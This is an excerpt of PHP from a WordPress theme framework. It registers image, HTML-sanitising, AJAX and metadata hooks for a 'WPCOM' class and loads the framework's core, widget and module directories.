add_filter( 'wp_get_attachment_image_src', array('WPCOM', 'thumbnail_src'), 10, 4 );
add_filter( 'wp_get_attachment_image_attributes', array('WPCOM', 'thumbnail_attr'), 20, 3 );
add_filter( 'wp_kses_allowed_html', array('WPCOM', 'kses_allowed_html'), 20 );

add_action( 'init', array('WPCOM', 'shortcode_render') );
add_action( 'wp_ajax_wpcom_options', array( 'WPCOM', '_options') );
add_action( 'wp_ajax_wpcom_icons', array( 'WPCOM', '_icons') );
add_filter( 'get_post_metadata', array( 'WPCOM', 'meta_filter' ), 20, 4 );
add_filter( 'add_post_metadata', array( 'WPCOM', 'add_metadata' ), 20, 4 );
add_filter( 'update_post_metadata', array( 'WPCOM', 'add_metadata' ), 20, 4 );
add_filter( 'get_user_metadata', array( 'WPCOM', 'meta_filter' ), 20, 4 );
add_filter( 'add_user_metadata', array( 'WPCOM', 'add_metadata' ), 20, 4 );
add_filter( 'update_user_metadata', array( 'WPCOM', 'add_metadata' ), 20, 4 );
add_filter( 'get_term_metadata', array( 'WPCOM', 'meta_filter' ), 20, 4 );

add_action( 'transition_post_status', array('WPCOM', 'check_post_images'), 10, 3 );
add_action( 'wp_head', array( 'WPCOM', 'modules_style' ), 30 );

$tpl_dir = get_template_directory();
$sty_dir = get_stylesheet_directory();

require FRAMEWORK_PATH . '/core/panel.php';
require FRAMEWORK_PATH . '/core/module.php';
require FRAMEWORK_PATH . '/core/widget.php';

if(is_dir($tpl_dir . '/widgets')) WPCOM::load($tpl_dir . '/widgets');
WPCOM::load(FRAMEWORK_PATH . '/functions');
WPCOM::load(FRAMEWORK_PATH . '/widgets');
WPCOM::load(FRAMEWORK_PATH . '/modules');
WPCOM::load($tpl_dir . '/modules');
if($tpl_dir !== $sty_dir) {
    WPCOM::load($sty_dir . '/modules');
}